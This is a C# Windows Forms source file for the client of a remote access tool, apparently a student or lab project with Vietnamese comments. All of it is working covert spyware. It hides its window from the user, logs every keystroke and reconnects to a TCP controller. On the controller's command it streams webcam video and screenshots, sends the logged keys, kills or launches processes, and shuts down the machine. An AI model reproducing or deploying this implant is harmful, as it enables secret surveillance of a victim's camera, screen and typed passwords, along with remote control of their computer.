using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using AForge.Video;
using AForge.Video.DirectShow;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Linq;

namespace TargetApp
{
    public partial class Form1 : Form
    {
        // --- CẤU HÌNH ---
        const string HOST_IP = "127.0.0.1";
        const int HOST_PORT = 9999;

        // Mutex chống chạy 2 bản cùng lúc
        private static Mutex _mutex = null;

        TcpClient client;
        NetworkStream stream;
        private readonly object _lockObj = new object();

        VideoCaptureDevice videoSource;
        bool isCamOn = false;
        bool isSendingImage = false;
        bool firstFrameCaptured = false;

        // Keylog
        [DllImport("User32.dll")] public static extern short GetAsyncKeyState(int vKey);
        System.Windows.Forms.Timer keylogTimer = new System.Windows.Forms.Timer();
        StringBuilder keyLogBuffer = new StringBuilder();

        public Form1()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;

            // --- KIỂM TRA CHẠY TRÙNG ---
            const string appName = "TargetApp_Unique_Final";
            bool createdNew;
            _mutex = new Mutex(true, appName, out createdNew);
            if (!createdNew) { Environment.Exit(0); return; }

            // --- TÀNG HÌNH ---
            this.ShowInTaskbar = false;
            this.Opacity = 0;
            this.FormBorderStyle = FormBorderStyle.None;
            this.Size = new Size(1, 1);
            this.Text = "";

            this.Load += Form1_Load;
            this.FormClosing += Form1_FormClosing;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Thread t = new Thread(ConnectLoop);
            t.IsBackground = true;
            t.Start();

            keylogTimer.Interval = 10;
            keylogTimer.Tick += KeylogTimer_Tick;
            keylogTimer.Start();
        }

        void SendPacket(string msg)
        {
            if (client == null || !client.Connected) return;
            try
            {
                byte[] data = Encoding.UTF8.GetBytes(msg);
                byte[] len = BitConverter.GetBytes(data.Length);
                lock (_lockObj)
                {
                    stream.Write(len, 0, 4);
                    stream.Write(data, 0, data.Length);
                    stream.Flush();
                }
            }
            catch { }
        }

        void ConnectLoop()
        {
            while (true)
            {
                try
                {
                    client = new TcpClient();
                    client.Connect(HOST_IP, HOST_PORT);
                    stream = client.GetStream();

                    SendPacket("INFO|" + Environment.MachineName + "|Sẵn sàng");

                    byte[] buffer = new byte[4096];
                    while (client.Connected)
                    {
                        if (stream.DataAvailable)
                        {
                            int len = stream.Read(buffer, 0, buffer.Length);
                            if (len > 0)
                            {
                                string cmd = Encoding.UTF8.GetString(buffer, 0, len);
                                ProcessCommand(cmd);
                            }
                        }
                        Thread.Sleep(10);
                    }
                }
                catch { Thread.Sleep(2000); }
            }
        }

        void ProcessCommand(string cmd)
        {
            try
            {
                string[] parts = cmd.Split('|');
                string action = parts[0];
                string param = parts.Length > 1 ? parts[1] : "";

                if (action == "WEBCAM_ON") StartWebcam();
                else if (action == "WEBCAM_OFF") StopWebcam();
                else if (action == "SCREENSHOT")
                {
                    string s = CaptureScreen();
                    if (!string.IsNullOrEmpty(s)) SendPacket("IMG|" + s);
                }
                else if (action == "LIST") SendPacket("PID:\n" + GetProcs());
                else if (action == "KEYLOG")
                {
                    string logs = keyLogBuffer.ToString();
                    keyLogBuffer.Clear();
                    SendPacket("KEYLOG:\n" + (string.IsNullOrEmpty(logs) ? "(Trống)" : logs));
                }
                else if (action == "START")
                {
                    try { Process.Start(param); SendPacket($"OK: Đã mở '{param}'"); }
                    catch { SendPacket($"LỖI: Không mở được '{param}'"); }
                }
                else if (action == "STOP") StopProcess(param);
                else if (action == "SHUTDOWN") Process.Start("shutdown", "/s /t 0");
                else if (action == "RESTART")
                {
                    SendPacket("Đang khởi động lại máy...");
                    Process.Start("shutdown", "/r /t 0");
                }
            }
            catch { }
        }

        // --- CAMERA SAFE MODE ---
        void StartWebcam()
        {
            try
            {
                if (isCamOn) { SendPacket("Info: Camera đang chạy rồi."); return; }

                var devs = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                if (devs.Count == 0) { SendPacket("Lỗi: Không tìm thấy Webcam!"); return; }

                videoSource = new VideoCaptureDevice(devs[0].MonikerString);

                videoSource.NewFrame += VideoSource_NewFrame;
                videoSource.Start();
                isCamOn = true;

                SendPacket(">>> DA BAT CAMERA (OPTIMIZED) <<<");
            }
            catch (Exception ex)
            {
                SendPacket("CRITICAL ERROR: " + ex.Message);
                isCamOn = false;
            }
        }

        void StopWebcam()
        {
            SendPacket("CAM_OFF");
            SendPacket(">>> DA TAT CAMERA! <<<");
            if (!isCamOn) return;
            isCamOn = false;
            firstFrameCaptured = false;

            try
            {
                if (videoSource != null && videoSource.IsRunning)
                {
                    videoSource.SignalToStop();
                    videoSource.WaitForStop();
                    videoSource = null;
                }
            }
            catch { }
        }

        // --- XỬ LÝ ẢNH (ĐÃ TỐI ƯU ĐỂ TRÁNH NGHẼN MẠNG) ---
        private void VideoSource_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            if (!isCamOn || isSendingImage) return;
            isSendingImage = true;
            try
            {
                if (!firstFrameCaptured)
                {
                    SendPacket("DEBUG: Da chup duoc anh dau tien!");
                    firstFrameCaptured = true;
                }

                using (Bitmap original = (Bitmap)eventArgs.Frame.Clone())
                {
                    using (MemoryStream ms = new MemoryStream())
                    {
                        EncoderParameters eps = new EncoderParameters(1);
                        // Giảm chất lượng xuống 40 để nhẹ mạng
                        eps.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 40L);
                        original.Save(ms, GetEncoder(ImageFormat.Jpeg), eps);
                        string base64 = Convert.ToBase64String(ms.ToArray());
                        SendPacket("IMG|" + base64);
                    }
                }
                // Nghỉ 100ms để Server kịp xử lý
                Thread.Sleep(100);
            }
            catch { }
            finally { isSendingImage = false; }
        }

        // --- HÀM LẤY ENCODER (CHỈ CÓ 1 CÁI DUY NHẤT) ---
        private ImageCodecInfo GetEncoder(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }
            return null;
        }

        // --- TIỆN ÍCH ---
        void StopProcess(string param)
        {
            try
            {
                string targetName = param.ToLower().Trim().Replace(".exe", "");
                int count = 0;
                if (int.TryParse(targetName, out int pid)) { try { Process.GetProcessById(pid).Kill(); count++; } catch { } }
                else
                {
                    foreach (var p in Process.GetProcesses())
                        if (p.ProcessName.ToLower().Contains(targetName)) { try { p.Kill(); count++; } catch { } }
                }
                SendPacket($"Đã diệt {count} tiến trình '{targetName}'");
            }
            catch { }
        }

        private bool[] _prevKeys = new bool[256];
        private void KeylogTimer_Tick(object sender, EventArgs e)
        {
            for (int i = 0; i < 255; i++)
            {
                short state = GetAsyncKeyState(i);
                if (((state & 0x8000) != 0) && !_prevKeys[i])
                {
                    Keys key = (Keys)i;
                    keyLogBuffer.Append($"[{key}]");
                }
                _prevKeys[i] = (state & 0x8000) != 0;
            }
        }
        string GetProcs() { return string.Join("\n", Process.GetProcesses().Select(p => $"[{p.Id}] {p.ProcessName}")); }
        string CaptureScreen()
        {
            try
            {
                Rectangle b = Screen.GetBounds(Point.Empty);
                using (Bitmap bmp = new Bitmap(b.Width, b.Height))
                {
                    using (Graphics g = Graphics.FromImage(bmp)) g.CopyFromScreen(Point.Empty, Point.Empty, b.Size);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        bmp.Save(ms, ImageFormat.Jpeg);
                        return Convert.ToBase64String(ms.ToArray());
                    }
                }
            }
            catch { return ""; }
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e) { StopWebcam(); }
    }
}